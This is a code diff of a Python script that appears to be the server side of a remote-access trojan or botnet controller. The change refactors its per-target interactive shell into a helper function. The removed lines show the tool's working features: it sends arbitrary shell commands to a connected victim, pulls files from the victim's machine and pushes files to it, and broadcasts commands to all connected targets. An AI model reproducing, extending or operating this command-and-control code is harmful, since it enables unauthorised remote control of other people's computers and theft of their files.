@@ -9,6 +9,7 @@ import base64
 import readline
 import threading
 
+
 ips = []
 targets = []
 clients = 0
@@ -53,43 +54,9 @@ while True:
             num = int(command[8:])
             target_socket = targets[num]
             target_ip = ips[num]
-            while True:
-                try:
-                    cmd = input(f"{target_ip}~$ ")
-                    utils.reliable_send(target_socket, cmd)
-                    if cmd == "q":
-                        break
-                    elif cmd == "close":
-                        target_socket.close()
-                        targets.remove(target_socket)
-                        ips.remove(target_ip)
-                        break
-                    elif cmd[:8] == "download":
-                        file_data = utils.receive_frame(target_socket)
-                        if file_data == "DOWNLOAD_FAIL":
-                            print("Download Failed")
-                        else:
-                            with open(cmd[9:],"wb") as f:
-                                f.write(base64.b64decode(file_data))
-                    elif cmd[:6] == "upload":
-                        try:
-                            with open(cmd[7:],"rb") as f:
-                                file_to_upload = f.read()
-                                encoded_file = base64.b64encode(file_to_upload)
-                                utils.reliable_send(target_socket, encoded_file.decode("utf-8"))
-                        except Exception as e:
-                            print(e)
-                            failed = "UPLOAD_FAIL"
-                            utils.reliable_send(target_socket, failed)
-                except Exception as e:
-                    print(str(e))
-
-                message = utils.receive_frame(target_socket)
-                if message:
-                    print(message, flush=True)
+            utils.start_shell(target_socket,target_ip)
         except Exception as e:
             print(str(e))
-            pass
     if command [:7] == "sendall":
         targets_len = len(targets)
         for i in range(0,targets_len):
@@ -107,3 +74,4 @@ while True:
         stop_threads = True
         t1.join()
         break
+
